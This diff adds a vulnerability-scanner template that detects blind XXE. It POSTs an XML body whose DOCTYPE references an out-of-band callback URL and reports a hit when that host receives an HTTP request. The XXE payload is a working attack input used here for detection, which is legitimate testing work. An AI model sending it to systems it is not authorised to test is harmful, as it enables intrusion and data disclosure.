@@ -1,0 +1,27 @@
+id: generic-blind-xxe
+brief:
+    title: Generic Blind XXE
+    by: geeknik
+    level: high
+    about: This template detects Generic Blind XXE.
+    label:
+        - xxe
+        - generic
+        - blind
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Referer: '{{BaseURL}}'
+      body: |-
+        <?xml version="1.0"?>
+        <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
+        <foo>&e1;</foo>
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
